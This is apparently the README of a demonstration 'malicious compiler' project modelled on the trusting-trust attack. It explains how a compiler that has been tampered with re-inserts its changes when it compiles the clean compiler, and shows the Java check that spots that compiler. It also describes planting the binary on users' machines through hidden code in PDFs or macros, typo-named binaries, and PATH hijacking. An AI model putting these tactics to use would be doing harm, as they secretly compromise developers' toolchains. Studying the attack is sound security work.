# Malicious Compiler
## How to install?
Follow the steps explained in [README-INSTALL.md](README-INSTALL.md) file.

## Compiler knowledge propagation
### High Level Explanation
First we compile the dirty compiler with the clean compiler to produce a bugged binary. 
We install this binary as the official C compiler (see [how to do it without raising suspicious](README.md#How to inject this compiler to an average user)). 
We can now remove the changes from the source of the compiler, and the new binary will reinsert the modifications whenever it is compiled.
This way, the compiler will remain dirty with no trace in source anywhere.

### How it actually works? 
We find out if the file we are compiling is the clean compiler by this code:
```
private static boolean isCleanCompiler(File program) throws FileNotFoundException {
    Pattern shebangPattern = Pattern.compile(CLEAN_COMPILER_IDENTIFIER);

    Scanner programScanner = new Scanner(program);
    String firstLine = new Scanner(program).nextLine();
    programScanner.close();

    return shebangPattern.matcher(firstLine).matches();
}
```
Which trying to find the pattern: `// 2jndaw9fiasndjf393u48fun24rj84jfu4h9` at the beginning of the clean compiler.
After we detect the clean compiler, we make it dirty be calling `getDirtyCompiler()`.

## How to inject this compiler to an average user
- ***Self-Motivation*** - By adding this compiler some desired functionalities, the user will *self-voluntarily* use it in order to
  gain all of its good aspects
- ***Unknowingly*** - *hiding* some code inside a file (like pdf) that after opening gets executed, inject the dirty
  compiler, and add the right environment path without the user even know about it. It is also possible using 
  [Macros](https://support.microsoft.com/en-us/office/create-or-run-a-macro-c6b99036-905c-49a6-818a-dfb98b7c3c9c)

## Ways to operate
- ***Easy-way*** - install the compiler's binary as `javax`, `javad`, `javaf` or `javav` and *add* the right environment 
  path. This way *typos* will start the dirty compiler
  
  ![typos.png](typos.png)
- ***Hard-way*** - install the compiler's binary as `javac` and *modify* the right environment
  path. This way *doesn't require unusual behavior* from the user to start the dirty compiler
  
## Author
Built by Nadav Rosenberg and Shlomi Haver
